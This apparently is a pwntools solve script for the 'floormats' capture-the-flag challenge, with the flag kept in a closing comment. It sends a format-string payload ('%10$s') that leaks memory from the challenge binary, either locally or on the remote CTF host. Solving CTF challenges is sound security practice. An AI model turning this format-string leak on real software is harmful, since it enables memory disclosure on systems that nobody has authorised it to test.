#!/usr/bin/env python3
from pwn import *

context.terminal = 'wt.exe sp -d . wsl.exe -d Ubuntu'.split()
context.arch = 'amd64'
elf = ELF('./floormats')
# lib = ELF('./libc.so.6', checksec=False)

script = """
brva 0x0000000000014D5
c
"""

if args.REMOTE:
    p = remote('floormats.ctf.intigriti.io', 1337)
elif args.GDB:
    p = gdb.debug(elf.path, gdbscript=script, aslr=False)
else:
    p = process(elf.path)

p.sendlineafter(b':\n', b'6')
p.sendlineafter(b':\n', b'%10$s')



p.interactive()

# INTIGRITI{50_7h475_why_7h3y_w4rn_4b0u7_pr1n7f}